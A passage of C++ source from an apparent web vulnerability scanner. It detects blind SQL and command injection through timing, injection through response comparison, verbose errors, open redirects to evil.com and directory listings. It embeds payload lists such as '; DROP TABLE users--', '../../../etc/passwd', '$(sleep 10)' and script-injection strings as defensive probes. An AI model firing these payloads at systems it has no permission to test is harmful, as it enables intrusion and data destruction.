        checkSecurityHeaders(result, findings);
        checkCookies(result, findings);
        checkCORS(result, findings);
        checkReflectedXSS(result, findings);
        checkCSRF(result, findings);
        checkIDOR(result, findings);
        checkSQLInjection(result, findings);
        checkCommandInjection(result, findings);
        checkPathTraversal(result, findings);
        checkSSRF(result, findings);
        checkXXE(result, findings);
        checkSSTI(result, findings);
        checkSensitiveDataExposure(result, findings);
        checkResponsePatterns(result, findings);
        checkBlindInjection(result, findings);
        checkBaselineComparison(result, findings);
        checkInformationDisclosure(result, findings);
        checkOpenRedirect(result, findings);
        checkDirectoryListing(result, findings);
        checkHTTPMethodVulnerabilities(result, findings);
    }

    findings.erase(
        std::remove_if(findings.begin(), findings.end(),
            [this](const Finding& f) { return f.confidence < confidenceThreshold_; }),
        findings.end()
    );

    return findings;
}

void VulnEngine::checkBlindInjection(const CrawlResult& result, std::vector<Finding>& findings) {
    if (!timing_analyzer_) {
        return;
    }
    
    // Only test endpoints that accept parameters
    if (result.params.empty() && result.method != "POST" && result.method != "PUT") {
        return;
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Test blind SQL injection payloads
    std::vector<std::string> sql_payloads = {
        "1' AND SLEEP(5)--",
        "1' AND SLEEP(5)#",
        "1' AND pg_sleep(5)--",
        "1'; WAITFOR DELAY '00:00:05'--",
        "1' OR SLEEP(5)--"
    };
    
    // Establish baseline first
    TimingBaseline baseline = timing_analyzer_->establish_baseline(base_req);
    
    if (baseline.sample_count < 3) {
        // Failed to establish baseline, skip timing analysis
        return;
    }
    
    // Test SQL injection payloads
    for (const auto& payload : sql_payloads) {
        TimingResult timing_result = timing_analyzer_->test_payload_validated(
            base_req, payload, baseline, "sql");
        
        if (timing_result.is_anomaly && timing_result.confidence >= confidenceThreshold_) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.method = result.method;
            f.category = "blind_sql_injection";
            f.headers = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
            );
            
            nlohmann::json evidence;
            evidence["description"] = "Blind SQL injection detected via timing analysis";
            evidence["payload"] = payload;
            evidence["baseline_time_ms"] = baseline.average_time_ms;
            evidence["measured_time_ms"] = timing_result.measured_time_ms;
            evidence["deviation_ms"] = timing_result.deviation_ms;
            evidence["deviation_percentage"] = timing_result.deviation_percentage;
            evidence["confidence"] = timing_result.confidence;
            evidence["measurements"] = nlohmann::json::array();
            for (double m : timing_result.measurements) {
                evidence["measurements"].push_back(m);
            }
            evidence["baseline_variance_ms"] = baseline.variance_ms;
            evidence["baseline_std_dev_ms"] = baseline.standard_deviation_ms;
            
            f.evidence = evidence;
            f.severity = "high";
            f.confidence = timing_result.confidence;
            f.remediation_id = "sql_injection";
            
            findings.push_back(std::move(f));
            
            // Only report first successful detection to avoid duplicates
            break;
        }
    }
    
    // Test command injection payloads (for POST/PUT requests with body parameters)
    if (result.method == "POST" || result.method == "PUT") {
        std::vector<std::string> cmd_payloads = {
            "; sleep 10",
            "| sleep 10",
            "&& sleep 10",
            "`sleep 10`",
            "$(sleep 10)"
        };
        
        for (const auto& payload : cmd_payloads) {
            TimingResult timing_result = timing_analyzer_->test_payload_validated(
                base_req, payload, baseline, "command");
            
            if (timing_result.is_anomaly && timing_result.confidence >= confidenceThreshold_) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = result.method;
                f.category = "blind_command_injection";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Blind command injection detected via timing analysis";
                evidence["payload"] = payload;
                evidence["baseline_time_ms"] = baseline.average_time_ms;
                evidence["measured_time_ms"] = timing_result.measured_time_ms;
                evidence["deviation_ms"] = timing_result.deviation_ms;
                evidence["deviation_percentage"] = timing_result.deviation_percentage;
                evidence["confidence"] = timing_result.confidence;
                evidence["measurements"] = nlohmann::json::array();
                for (double m : timing_result.measurements) {
                    evidence["measurements"].push_back(m);
                }
                evidence["baseline_variance_ms"] = baseline.variance_ms;
                evidence["baseline_std_dev_ms"] = baseline.standard_deviation_ms;
                
                f.evidence = evidence;
                f.severity = "high";
                f.confidence = timing_result.confidence;
                f.remediation_id = "command_injection";
                
                findings.push_back(std::move(f));
                
                // Only report first successful detection
                break;
            }
        }
    }
}

void VulnEngine::checkBaselineComparison(const CrawlResult& result, std::vector<Finding>& findings) {
    if (!baseline_comparator_) {
        return;
    }
    
    // Only test endpoints that accept parameters
    if (result.params.empty() && result.method != "POST" && result.method != "PUT") {
        return;
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Get baseline response
    HttpResponse baseline_resp;
    if (!client_.perform(base_req, baseline_resp)) {
        return;
    }
    
    // Establish timing baseline
    TimingBaseline timing_baseline;
    if (timing_analyzer_) {
        timing_baseline = timing_analyzer_->establish_baseline(base_req);
    }
    
    // Test payloads
    std::vector<std::string> test_payloads = {
        "1' OR '1'='1",
        "1' AND '1'='2",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "1' OR 1=1--",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "'; sleep 5--"
    };
    
    for (const auto& payload : test_payloads) {
        // Create test request with payload
        HttpRequest test_req = base_req;
        
        if (result.method == "GET" || result.method == "HEAD") {
            size_t param_pos = test_req.url.find('?');
            if (param_pos != std::string::npos) {
                test_req.url += "&test=" + payload;
            } else {
                test_req.url += "?test=" + payload;
            }
        } else {
            if (test_req.body.empty()) {
                test_req.body = "test=" + payload;
            } else {
                test_req.body += "&test=" + payload;
            }
        }
        
        // Make test request
        HttpResponse test_resp;
        auto start = std::chrono::high_resolution_clock::now();
        bool success = client_.perform(test_req, test_resp);
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        double test_timing_ms = static_cast<double>(duration.count());
        
        if (!success) {
            continue;
        }
        
        // Compare responses
        ComparisonResult comparison = baseline_comparator_->compare(
            baseline_resp, test_resp, timing_baseline, test_timing_ms, payload);
        
        if (comparison.indicates_vulnerability && comparison.confidence >= confidenceThreshold_) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.method = result.method;
            f.category = comparison.vulnerability_type.empty() ? "injection" : comparison.vulnerability_type;
            f.headers = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
            );
            
            nlohmann::json evidence;
            evidence["description"] = "Vulnerability detected via baseline comparison";
            evidence["payload"] = payload;
            evidence["status_changed"] = comparison.status_changed;
            evidence["baseline_status"] = comparison.baseline_status;
            evidence["test_status"] = comparison.test_status;
            evidence["length_changed"] = comparison.length_changed;
            evidence["baseline_length"] = comparison.baseline_length;
            evidence["test_length"] = comparison.test_length;
            evidence["length_difference"] = comparison.length_difference;
            evidence["length_change_percentage"] = comparison.length_change_percentage;
            evidence["similarity_score"] = comparison.similarity_score;
            evidence["has_new_errors"] = comparison.has_new_errors;
            evidence["new_errors"] = nlohmann::json::array();
            for (const auto& error : comparison.new_errors) {
                evidence["new_errors"].push_back(error);
            }
            evidence["timing_anomaly"] = comparison.timing_anomaly;
            evidence["baseline_time_ms"] = comparison.baseline_time_ms;
            evidence["test_time_ms"] = comparison.test_time_ms;
            evidence["timing_deviation_ms"] = comparison.timing_deviation_ms;
            evidence["confidence"] = comparison.confidence;
            
            f.evidence = evidence;
            f.severity = (comparison.confidence > 0.8) ? "high" : "medium";
            f.confidence = comparison.confidence;
            f.remediation_id = comparison.vulnerability_type.empty() ? "injection" : comparison.vulnerability_type;
            
            findings.push_back(std::move(f));
            
            // Only report first successful detection to avoid duplicates
            break;
        }
    }
}

void VulnEngine::checkInformationDisclosure(const CrawlResult& result, std::vector<Finding>& findings) {
    // Early return if we don't have a response analyzer configured
    if (!response_analyzer_) {
        return;
    }
    
    // Fetch the response body by making an HTTP request
    HttpRequest req;
    req.method = result.method;
    req.url = result.url;
    req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    enhance_request_with_session(req);
    
    HttpResponse resp;
    if (!client_.perform(req, resp)) {
        return; // Can't analyze if request fails
    }
    
    // Convert the header vector to a map for easier lookup
    // This makes it simpler to check for specific headers like X-Powered-By
    std::map<std::string, std::string> headers_map;
    for (const auto& [key, value] : result.headers) {
        headers_map[key] = value;
    }
    // Also add response headers
    for (const auto& [key, value] : resp.headers) {
        headers_map[key] = value;
    }
    
    // Use the response analyzer to scan the response body for patterns
    // This will detect stack traces, internal paths, IPs, and other sensitive info
    AnalysisResult analysis = response_analyzer_->analyze(resp.body, headers_map);
    
    // Check for version information in HTTP headers
    // These headers often leak framework and server versions that attackers can use
    // to find known vulnerabilities
    std::vector<std::string> version_headers = {
        "x-powered-by",      // PHP, ASP.NET often expose versions here
        "server",            // Web server version (Apache, nginx, IIS)
        "x-aspnet-version",  // ASP.NET version
        "x-aspnetmvc-version", // ASP.NET MVC version
        "x-runtime",         // Runtime version info
        "x-version"          // Generic version header
    };
    
    // Collect any exposed version information
    std::vector<std::string> exposed_versions;
    for (const auto& header_name : version_headers) {
        auto it = headers_map.find(header_name);
        if (it != headers_map.end()) {
            exposed_versions.push_back(header_name + ": " + it->second);
        }
    }
    
    // Check if we found any stack traces in the response
    // Stack traces reveal code structure, file paths, and can help attackers understand the app
    if (analysis.has_stack_trace) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "information_disclosure";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        nlohmann::json evidence;
        evidence["description"] = "Stack trace detected in response";
        evidence["type"] = "stack_trace";
        evidence["framework"] = analysis.detected_framework;
        
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : analysis.matches) {
            if (match.type == PatternType::STACK_TRACE) {
                nlohmann::json match_json;
                match_json["pattern"] = match.pattern_name;
                match_json["framework"] = match.framework;
                match_json["evidence"] = match.evidence;
                match_json["context"] = match.context;
                matches_json.push_back(match_json);
            }
        }
        evidence["matches"] = matches_json;
        
        f.evidence = evidence;
        f.severity = "medium";
        f.confidence = 0.9;
        f.remediation_id = "error_handling";
        
        findings.push_back(std::move(f));
    }
    
    // Check for debug information (internal paths, IPs, versions, debug mode)
    bool has_debug_info = analysis.has_debug_info;
    if (has_debug_info || !exposed_versions.empty()) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "information_disclosure";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        nlohmann::json evidence;
        evidence["description"] = "Information disclosure detected";
        evidence["type"] = "debug_information";
        
        nlohmann::json matches_json = nlohmann::json::array();
        for (const auto& match : analysis.matches) {
            if (match.type == PatternType::DEBUG_INFO) {
                nlohmann::json match_json;
                match_json["pattern"] = match.pattern_name;
                match_json["evidence"] = match.evidence;
                match_json["context"] = match.context;
                matches_json.push_back(match_json);
            }
        }
        evidence["matches"] = matches_json;
        
        if (!exposed_versions.empty()) {
            evidence["exposed_headers"] = nlohmann::json::array();
            for (const auto& version : exposed_versions) {
                evidence["exposed_headers"].push_back(version);
            }
        }
        
        f.evidence = evidence;
        f.severity = "medium";
        f.confidence = 0.85;
        f.remediation_id = "information_disclosure";
        
        findings.push_back(std::move(f));
    }
    
    // Check for version information in headers only (if no other findings)
    if (!exposed_versions.empty() && !has_debug_info && !analysis.has_stack_trace) {
        Finding f;
        f.id = "finding_" + std::to_string(findings.size() + 1);
        f.url = result.url;
        f.method = result.method;
        f.category = "information_disclosure";
        f.headers = std::map<std::string, std::string>(
            result.headers.begin(),
            result.headers.end()
        );
        
        nlohmann::json evidence;
        evidence["description"] = "Version information exposed in HTTP headers";
        evidence["type"] = "version_disclosure";
        evidence["exposed_headers"] = nlohmann::json::array();
        for (const auto& version : exposed_versions) {
            evidence["exposed_headers"].push_back(version);
        }
        
        f.evidence = evidence;
        f.severity = "low";
        f.confidence = 0.75;
        f.remediation_id = "information_disclosure";
        
        findings.push_back(std::move(f));
    }
    
    // Try to trigger verbose errors with error-triggering payloads
    // This helps detect applications that only show detailed errors on actual errors
    if (result.params.empty() && result.method == "GET") {
        // Only test GET requests with parameters
        return;
    }
    
    // Create request with error-triggering payload
    HttpRequest error_req;
    error_req.method = result.method;
    error_req.url = result.url;
    error_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    enhance_request_with_session(error_req);
    
    // Error-triggering payloads
    std::vector<std::string> error_payloads = {
        "{{7*7}}",           // Template injection
        "${7*7}",            // Expression language
        "%{7*7}",            // Expression language
        "../../../etc/passwd", // Path traversal
        "null",              // Null reference
        "undefined",          // Undefined variable
        "NaN",               // Not a number
        "[]",                // Empty array access
        "{}",                // Empty object access
    };
    
    for (const auto& payload : error_payloads) {
        HttpRequest test_req = error_req;
        
        if (result.method == "GET" || result.method == "HEAD") {
            size_t param_pos = test_req.url.find('?');
            if (param_pos != std::string::npos) {
                test_req.url += "&test=" + payload;
            } else {
                test_req.url += "?test=" + payload;
            }
        } else {
            if (test_req.body.empty()) {
                test_req.body = "test=" + payload;
            } else {
                test_req.body += "&test=" + payload;
            }
        }
        
        HttpResponse test_resp;
        if (!client_.perform(test_req, test_resp)) {
            continue;
        }
        
        // Analyze error-triggered response
        std::map<std::string, std::string> test_headers_map;
        for (const auto& [key, value] : test_resp.headers) {
            test_headers_map[key] = value;
        }
        
        AnalysisResult error_analysis = response_analyzer_->analyze(test_resp.body, test_headers_map);
        
        // Check if error-triggering payload elicited verbose errors
        if (error_analysis.has_stack_trace || 
            (error_analysis.has_debug_info && !analysis.has_debug_info)) {
            Finding f;
            f.id = "finding_" + std::to_string(findings.size() + 1);
            f.url = result.url;
            f.method = result.method;
            f.category = "information_disclosure";
            f.headers = std::map<std::string, std::string>(
                result.headers.begin(),
                result.headers.end()
            );
            
            nlohmann::json evidence;
            evidence["description"] = "Verbose error output detected when triggering errors";
            evidence["type"] = "error_triggered_disclosure";
            evidence["triggering_payload"] = payload;
            
            if (error_analysis.has_stack_trace) {
                evidence["stack_trace_detected"] = true;
                evidence["framework"] = error_analysis.detected_framework;
            }
            
            if (error_analysis.has_debug_info && !analysis.has_debug_info) {
                evidence["debug_info_detected"] = true;
            }
            
            f.evidence = evidence;
            f.severity = "medium";
            f.confidence = 0.85;
            f.remediation_id = "error_handling";
            
            findings.push_back(std::move(f));
            
            // Only report first successful detection
            break;
        }
    }
}

void VulnEngine::checkOpenRedirect(const CrawlResult& result, std::vector<Finding>& findings) {
    // These are common parameter names that applications use for redirects
    // We'll test any parameters with these names, plus test these names directly
    // if we don't find matching parameters
    std::vector<std::string> redirect_params = {
        "url", "redirect", "next", "return", "goto", "destination",
        "returnUrl", "return_url", "returnTo", "return_to",
        "redirectTo", "redirect_to", "redirectUrl", "redirect_url",
        "target", "link", "href", "forward", "continue", "r"
    };
    
    // Test with external domains that we can verify
    // We use "evil.com" as a test domain - if the app redirects here, it's vulnerable
    // We test various formats to catch different validation approaches
    std::vector<std::string> test_domains = {
        "https://evil.com",      // Full HTTPS URL
        "http://evil.com",       // Full HTTP URL
        "//evil.com",            // Protocol-relative (bypasses some filters)
        "/\\evil.com",           // Backslash bypass (Windows-style)
        "https://evil.com/path", // URL with path
        "http://evil.com:8080",  // URL with port
    };
    
    // Bypass techniques that try to evade URL validation
    // Some apps check for "http://" but miss these variations
    std::vector<std::string> bypass_payloads = {
        "//evil.com",           // Protocol-relative - browser interprets as current protocol
        "/\\evil.com",          // Backslash instead of forward slash
        "%2f%2fevil.com",       // URL-encoded slashes
        "%2f%5cevil.com",       // URL-encoded backslash
        "evil.com",             // Domain only - might be interpreted as relative
        "evil.com/",            // Domain with trailing slash
        "\\evil.com",           // Backslash variant
        "javascript:alert(1)",  // JavaScript URI scheme
        "data:text/html,<script>alert(1)</script>", // Data URI scheme
    };
    
    // First, check if any existing parameters look like they might be redirect parameters
    // This helps us focus testing on parameters that are actually present
    std::vector<std::string> candidate_params;
    for (const auto& [param_name, param_value] : result.params) {
        std::string lower_param = param_name;
        std::transform(lower_param.begin(), lower_param.end(), lower_param.begin(), ::tolower);
        
        for (const auto& redirect_param : redirect_params) {
            if (lower_param.find(redirect_param) != std::string::npos) {
                candidate_params.push_back(param_name);
                break;
            }
        }
    }
    
    // If we didn't find any existing parameters that look like redirect params,
    // we'll test the common redirect parameter names anyway - they might be optional
    if (candidate_params.empty()) {
        candidate_params = redirect_params;
    }
    
    // Set up the base request that we'll modify for each test
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // We need two HTTP clients with different redirect settings:
    // One that doesn't follow redirects (so we can see the Location header)
    // and one that does follow redirects (so we can verify the final destination)
    HttpClient::Options no_redirect_opts;
    no_redirect_opts.follow_redirects = false;
    no_redirect_opts.timeout_seconds = 15;
    HttpClient no_redirect_client(no_redirect_opts);
    
    // This client will follow redirects so we can see where we actually end up
    HttpClient::Options follow_redirect_opts;
    follow_redirect_opts.follow_redirects = true;
    follow_redirect_opts.max_redirects = 10;
    follow_redirect_opts.timeout_seconds = 15;
    HttpClient follow_redirect_client(follow_redirect_opts);
    
    // Test each candidate parameter
    for (const auto& param_name : candidate_params) {
        // Test with external domain payloads
        for (const auto& payload : test_domains) {
            HttpRequest test_req = base_req;
            enhance_request_with_session(test_req);
            
            // Inject payload into parameter
            if (result.method == "GET" || result.method == "HEAD") {
                // Build URL with parameter
                std::ostringstream url_builder;
                url_builder << result.url;
                
                // Remove existing parameter if present
                size_t qpos = url_builder.str().find('?');
                if (qpos != std::string::npos) {
                    std::string base_url = url_builder.str().substr(0, qpos);
                    std::string query = url_builder.str().substr(qpos + 1);
                    
                    // Remove the parameter we're testing
                    std::ostringstream new_query;
                    bool first = true;
                    std::istringstream iss(query);
                    std::string pair;
                    while (std::getline(iss, pair, '&')) {
                        size_t eq = pair.find('=');
                        if (eq != std::string::npos) {
                            std::string key = pair.substr(0, eq);
                            if (key != param_name) {
                                if (!first) new_query << "&";
                                new_query << pair;
                                first = false;
                            }
                        } else {
                            if (pair != param_name) {
                                if (!first) new_query << "&";
                                new_query << pair;
                                first = false;
                            }
                        }
                    }
                    
                    url_builder.str("");
                    url_builder << base_url << "?";
                    if (!new_query.str().empty()) {
                        url_builder << new_query.str() << "&";
                    }
                    url_builder << param_name << "=" << payload;
                } else {
                    url_builder << "?" << param_name << "=" << payload;
                }
                
                test_req.url = url_builder.str();
            } else {
                // POST/PUT - inject into body
                std::ostringstream body_builder;
                
                // Build body from existing params
                std::map<std::string, std::string> body_params;
                for (const auto& [key, value] : result.params) {
                    body_params[key] = value;
                }
                
                // Replace or add our parameter
                body_params[param_name] = payload;
                
                // Rebuild body
                bool first = true;
                for (const auto& [key, value] : body_params) {
                    if (!first) body_builder << "&";
                    body_builder << key << "=" << value;
                    first = false;
                }
                
                test_req.body = body_builder.str();
            }
            
            // First, send the request without following redirects
            // This lets us see the Location header and status code
            HttpResponse redirect_resp;
            if (!no_redirect_client.perform(test_req, redirect_resp)) {
                continue; // Request failed, skip this payload
            }
            
            // Check if we got a redirect status code (3xx)
            // 301, 302, 303, 307, 308 are all redirects
            bool is_redirect = (redirect_resp.status >= 300 && redirect_resp.status < 400);
            std::string redirect_location;
            
            if (is_redirect) {
                // Extract the Location header which tells us where we're being redirected
                for (const auto& [header_name, header_value] : redirect_resp.headers) {
                    if (header_name == "location") {
                        redirect_location = header_value;
                        break;
                    }
                }
            }
            
            // Some applications use JavaScript redirects instead of HTTP redirects
            // Check for common JavaScript redirect patterns in the response body
            bool js_redirect = false;
            std::string js_redirect_target;
            
            if (redirect_resp.body.find("window.location") != std::string::npos ||
                redirect_resp.body.find("location.href") != std::string::npos ||
                redirect_resp.body.find("location.replace") != std::string::npos ||
                redirect_resp.body.find("document.location") != std::string::npos) {
                
                js_redirect = true;
                
                // Try to extract the actual redirect target from the JavaScript code
                // This regex looks for patterns like: window.location.href = "http://evil.com"
                std::regex js_location_regex(R"((?:window\.|document\.)?location(?:\.href|\.replace)?\s*=\s*['"]([^'"]+)['"])");
                std::smatch match;
                if (std::regex_search(redirect_resp.body, match, js_location_regex)) {
                    if (match.size() > 1) {
                        js_redirect_target = match[1].str();
                    }
                }
            }
            
            // Now follow the redirect to see where we actually end up
            // This is important because some redirects might chain or be modified
            HttpResponse final_resp;
            std::string final_url;
            
            if (is_redirect && !redirect_location.empty()) {
                // Follow the redirect chain to get the final destination
                if (follow_redirect_client.perform(test_req, final_resp)) {
                    final_url = final_resp.effective_url;
                }
            }
            
            // Determine if this is actually an open redirect vulnerability
            // We need to verify that the redirect actually goes to an external domain
            bool is_open_redirect = false;
            std::string vulnerable_param;
            std::string redirect_type;
            std::string bypass_technique;
            
            if (is_redirect && !redirect_location.empty()) {
                // Check if Location header contains external domain
                if (redirect_location.find("evil.com") != std::string::npos ||
                    redirect_location.find("//evil.com") != std::string::npos) {
                    is_open_redirect = true;
                    vulnerable_param = param_name;
                    redirect_type = "http_redirect";
                }
                
                // Check final destination
                if (!final_url.empty() && final_url.find("evil.com") != std::string::npos) {
                    is_open_redirect = true;
                    vulnerable_param = param_name;
                    redirect_type = "http_redirect";
                }
            }
            
            if (js_redirect) {
                if (js_redirect_target.find("evil.com") != std::string::npos ||
                    redirect_resp.body.find("evil.com") != std::string::npos) {
                    is_open_redirect = true;
                    vulnerable_param = param_name;
                    redirect_type = "javascript_redirect";
                }
            }
            
            // Check for bypass techniques
            if (is_open_redirect) {
                if (payload.find("//") == 0 || payload.find("/\\") == 0) {
                    bypass_technique = "protocol_relative";
                } else if (payload.find("%2f%2f") != std::string::npos) {
                    bypass_technique = "url_encoded_slashes";
                } else if (payload.find("\\") != std::string::npos) {
                    bypass_technique = "backslash";
                }
            }
            
            if (is_open_redirect) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = result.method;
                f.category = "open_redirect";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Open redirect vulnerability detected";
                evidence["vulnerable_parameter"] = vulnerable_param;
                evidence["payload"] = payload;
                evidence["redirect_type"] = redirect_type;
                evidence["redirect_status"] = redirect_resp.status;
                
                if (!redirect_location.empty()) {
                    evidence["location_header"] = redirect_location;
                }
                
                if (!final_url.empty()) {
                    evidence["final_destination"] = final_url;
                }
                
                if (js_redirect) {
                    evidence["javascript_redirect"] = true;
                    if (!js_redirect_target.empty()) {
                        evidence["js_redirect_target"] = js_redirect_target;
                    }
                }
                
                if (!bypass_technique.empty()) {
                    evidence["bypass_technique"] = bypass_technique;
                }
                
                f.evidence = evidence;
                f.severity = "medium";
                f.confidence = 0.9;
                f.remediation_id = "open_redirect";
                
                findings.push_back(std::move(f));
                
                // Only report first successful detection per parameter
                break;
            }
        }
        
        // Test bypass techniques if basic redirects didn't work
        if (findings.empty() || findings.back().category != "open_redirect") {
            for (const auto& bypass_payload : bypass_payloads) {
                HttpRequest bypass_req = base_req;
                enhance_request_with_session(bypass_req);
                
                // Inject bypass payload
                if (result.method == "GET" || result.method == "HEAD") {
                    size_t qpos = bypass_req.url.find('?');
                    if (qpos != std::string::npos) {
                        bypass_req.url += "&" + param_name + "=" + bypass_payload;
                    } else {
                        bypass_req.url += "?" + param_name + "=" + bypass_payload;
                    }
                } else {
                    if (bypass_req.body.empty()) {
                        bypass_req.body = param_name + "=" + bypass_payload;
                    } else {
                        bypass_req.body += "&" + param_name + "=" + bypass_payload;
                    }
                }
                
                HttpResponse bypass_resp;
                if (!no_redirect_client.perform(bypass_req, bypass_resp)) {
                    continue;
                }
                
                // Check for redirect
                bool bypass_redirect = (bypass_resp.status >= 300 && bypass_resp.status < 400);
                std::string bypass_location;
                
                if (bypass_redirect) {
                    for (const auto& [header_name, header_value] : bypass_resp.headers) {
                        if (header_name == "location") {
                            bypass_location = header_value;
                            break;
                        }
                    }
                }
                
                // Check if bypass worked
                if (bypass_redirect && !bypass_location.empty()) {
                    // Check if it redirects to external domain (even with bypass)
                    if (bypass_location.find("evil.com") != std::string::npos ||
                        bypass_location.find("//") == 0) {
                        
                        Finding f;
                        f.id = "finding_" + std::to_string(findings.size() + 1);
                        f.url = result.url;
                        f.method = result.method;
                        f.category = "open_redirect";
                        f.headers = std::map<std::string, std::string>(
                            result.headers.begin(),
                            result.headers.end()
                        );
                        
                        nlohmann::json evidence;
                        evidence["description"] = "Open redirect vulnerability detected with bypass technique";
                        evidence["vulnerable_parameter"] = param_name;
                        evidence["payload"] = bypass_payload;
                        evidence["redirect_type"] = "http_redirect";
                        evidence["redirect_status"] = bypass_resp.status;
                        evidence["location_header"] = bypass_location;
                        evidence["bypass_technique"] = "bypass_detected";
                        
                        f.evidence = evidence;
                        f.severity = "medium";
                        f.confidence = 0.85;
                        f.remediation_id = "open_redirect";
                        
                        findings.push_back(std::move(f));
                        
                        // Only report first successful bypass
                        break;
                    }
                }
            }
        }
    }
}

void VulnEngine::checkDirectoryListing(const CrawlResult& result, std::vector<Finding>& findings) {
    // Common directory paths to test
    std::vector<std::string> common_dirs = {
        "/admin/", "/backup/", "/uploads/", "/config/", "/logs/",
        "/files/", "/data/", "/tmp/", "/temp/", "/cache/",
        "/static/", "/assets/", "/media/", "/images/", "/documents/",
        "/private/", "/secret/", "/internal/", "/test/", "/dev/"
    };
    
    // Apache directory listing patterns
    std::vector<std::regex> apache_patterns = {
        std::regex(R"(Index of\s+[^\n<]+)", std::regex::icase),
        std::regex(R"(<title>Index of\s+[^<]+</title>)", std::regex::icase),
        std::regex(R"(<h1>Index of\s+[^<]+</h1>)", std::regex::icase),
        std::regex(R"(Parent Directory)", std::regex::icase),
        std::regex(R"(<img\s+[^>]*alt="\[DIR\]")", std::regex::icase),
        std::regex(R"(<img\s+[^>]*alt="\[PARENTDIR\]")", std::regex::icase),
    };
    
    // Nginx directory listing patterns
    std::vector<std::regex> nginx_patterns = {
        std::regex(R"(<title>Index of\s+[^<]+</title>)", std::regex::icase),
        std::regex(R"(<h1>Index of\s+[^<]+</h1>)", std::regex::icase),
        std::regex(R"(<a href="\.\./">\.\./</a>)", std::regex::icase),
    };
    
    // IIS directory listing patterns
    std::vector<std::regex> iis_patterns = {
        std::regex(R"(<title>Directory Listing\s+[^<]+</title>)", std::regex::icase),
        std::regex(R"(<h2>Directory Listing\s+[^<]+</h2>)", std::regex::icase),
        std::regex(R"(<table[^>]*class="directory")", std::regex::icase),
    };
    
    // Sensitive file extensions
    std::vector<std::string> sensitive_extensions = {
        ".sql", ".bak", ".env", ".config", ".conf",
        ".key", ".pem", ".p12", ".pfx", ".crt",
        ".log", ".old", ".backup", ".dump", ".tar",
        ".gz", ".zip", ".db", ".sqlite", ".mdb"
    };
    
    // Fetch the response body by making an HTTP request
    HttpRequest req;
    req.method = result.method;
    req.url = result.url;
    req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    enhance_request_with_session(req);
    
    HttpResponse resp;
    bool is_directory_listing = false;
    std::string server_type;
    std::vector<std::string> detected_files;
    std::vector<std::string> sensitive_files;
    
    if (client_.perform(req, resp)) {
        // Check if current result looks like a directory listing
        
        // Test Apache patterns
        for (const auto& pattern : apache_patterns) {
            std::smatch match;
            if (std::regex_search(resp.body, match, pattern)) {
                is_directory_listing = true;
                server_type = "Apache";
                break;
            }
        }
        
        // Test Nginx patterns
        if (!is_directory_listing) {
            for (const auto& pattern : nginx_patterns) {
                std::smatch match;
                if (std::regex_search(resp.body, match, pattern)) {
                    is_directory_listing = true;
                    server_type = "Nginx";
                    break;
                }
            }
        }
        
        // Test IIS patterns
        if (!is_directory_listing) {
            for (const auto& pattern : iis_patterns) {
                std::smatch match;
                if (std::regex_search(resp.body, match, pattern)) {
                    is_directory_listing = true;
                    server_type = "IIS";
                    break;
                }
            }
        }
        
        // Additional heuristics: check for file listing patterns
        if (!is_directory_listing) {
            // Check for common file listing indicators
            bool has_file_links = false;
            bool has_directory_indicators = false;
            
            // Look for file links (href to files)
            std::regex file_link_pattern(R"(<a\s+[^>]*href=["']([^"']+\.\w{2,4})["'])");
            std::sregex_iterator file_iter(resp.body.begin(), resp.body.end(), file_link_pattern);
            std::sregex_iterator file_end;
            
            size_t file_count = 0;
            for (; file_iter != file_end; ++file_iter) {
                file_count++;
                if (file_count > 5) {  // Multiple file links suggest directory listing
                    has_file_links = true;
                    break;
                }
            }
            
            // Look for directory indicators
            if (resp.body.find("Parent Directory") != std::string::npos ||
                resp.body.find("..") != std::string::npos ||
                resp.body.find("[DIR]") != std::string::npos ||
                resp.body.find("[PARENTDIR]") != std::string::npos) {
                has_directory_indicators = true;
            }
            
            // Check for table-based listings (common in directory listings)
            bool has_table_listing = false;
            if (resp.body.find("<table") != std::string::npos) {
                // Check if table contains file-related content
                std::regex table_file_pattern(R"(<td[^>]*>.*?\.\w{2,4}.*?</td>)");
                if (std::regex_search(resp.body, table_file_pattern)) {
                    has_table_listing = true;
                }
            }
        
            // Heuristic: if we have file links AND directory indicators, likely a directory listing
            if ((has_file_links && has_directory_indicators) || 
